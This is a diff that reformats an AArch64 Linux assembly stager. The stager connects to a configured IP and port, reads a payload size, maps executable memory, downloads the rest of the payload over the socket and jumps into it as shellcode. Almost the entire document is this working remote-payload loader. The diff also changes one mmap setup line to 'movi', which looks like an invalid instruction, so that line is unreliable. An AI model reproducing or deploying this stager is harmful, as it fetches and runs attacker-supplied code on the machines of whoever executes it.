@@ -15,82 +15,80 @@
 .equ PORT, 0x5C11
 
 start:
-        /* sockfd = socket(AF_INET, SOCK_STREAM, 0) */
-        mov    x0, AF_INET
-        mov    x1, SOCK_STREAM
-        mov    x2, 0
-        mov    x8, SYS_SOCKET
-        svc    0
-        mov    x12, x0
+    /* sockfd = socket(AF_INET, SOCK_STREAM, 0) */
+    mov    x0, AF_INET
+    mov    x1, SOCK_STREAM
+    mov    x2, 0
+    mov    x8, SYS_SOCKET
+    svc    0
+    mov    x12, x0
 
-        /* connect(sockfd, (struct sockaddr *)&server, sockaddr_len) */
-        adr    x1, sockaddr
-        mov    x2, 0x10
-        mov    x8, SYS_CONNECT
-        svc    0
-        cbnz   w0, failed
+    /* connect(sockfd, (struct sockaddr *)&server, sockaddr_len) */
+    adr    x1, sockaddr
+    mov    x2, 0x10
+    mov    x8, SYS_CONNECT
+    svc    0
+    cbnz   w0, failed
 
-		/* read(sockfd, buf='x1', nbytes=4) */
-        mov    x0, x12
-		sub    sp, sp, #16
-		mov    x1, sp
-		mov    x2, #4
-		mov    x8, SYS_READ
-		svc    0
-		cbz    w0, failed
+    /* read(sockfd, buf='x1', nbytes=4) */
+    mov    x0, x12
+    sub    sp, sp, #16
+    mov    x1, sp
+    mov    x2, #4
+    mov    x8, SYS_READ
+    svc    0
+    cbz    w0, failed
 
-		ldr    x2, [sp,#0]
+    ldr    x2, [sp,#0]
 
-		/* Page-align, assume <4GB */
-		lsr x2, x2, #12
-		add x2, x2, #1
-		lsl x2, x2, #12
+    /* Page-align, assume <4GB */
+    lsr    x2, x2, #12
+    add    x2, x2, #1
+    lsl    x2, x2, #12
 
-		/* mmap(addr=0, length='x2', prot=7, flags=34, fd=0, offset=0) */
-		mov  x0, xzr
-		mov  x1, x2
-		mov  x2, #7
-		mov  x3, #34
-		mov  x4, xzr
-		mov  x5, xzr
-		/* call mmap() */
-		mov  x8, SYS_MMAP
-		svc 0
+    /* mmap(addr=0, length='x2', prot=7, flags=34, fd=0, offset=0) */
+    mov    x0, xzr
+    mov    x1, x2
+    mov    x2, #7
+    mov    x3, #34
+    mov    x4, xzr
+    mov    x5, xzr
+    /* call mmap() */
+    movi   x8, SYS_MMAP
+    svc    0
 
-		/* Grab the saved size, save the address */
-		ldr x4, [sp]
+    /* Grab the saved size, save the address */
+    ldr    x4, [sp]
 
-		/* Save the memory address */
-		str x0, [sp]
+    /* Save the memory address */
+    str    x0, [sp]
 
-		/* Read in all of the data */
-		mov  x3, x0
+    /* Read in all of the data */
+    mov    x3, x0
 
 read_loop:
-		/* read(sockfd, buf='x3', nbytes='x4') */
-        mov  x0, x12
-		mov  x1, x3
-		mov  x2, x4
-		/* call read() */
-		mov  x8, SYS_READ
-		svc 0
-		add x3, x3, x0
-		subs x4, x4, x0
-		bne read_loop
+    /* read(sockfd, buf='x3', nbytes='x4') */
+    mov    x0, x12
+    mov    x1, x3
+    mov    x2, x4
+    mov    x8, SYS_READ
+    svc    0
+    add    x3, x3, x0
+    subs   x4, x4, x0
+    bne    read_loop
 
-		/* Go to shellcode */
-		ldr x30, [sp]
-		ret
+    /* Go to shellcode */
+    ldr    x30, [sp]
+    ret
 
 failed:
-        mov    x0, 0
-        mov    x8, SYS_EXIT
-        svc    0
+    mov    x0, 0
+    mov    x8, SYS_EXIT
+    svc    0
 
 .balign 4
 sockaddr:
 .short AF_INET
 .short PORT
 .word  IP
-
 
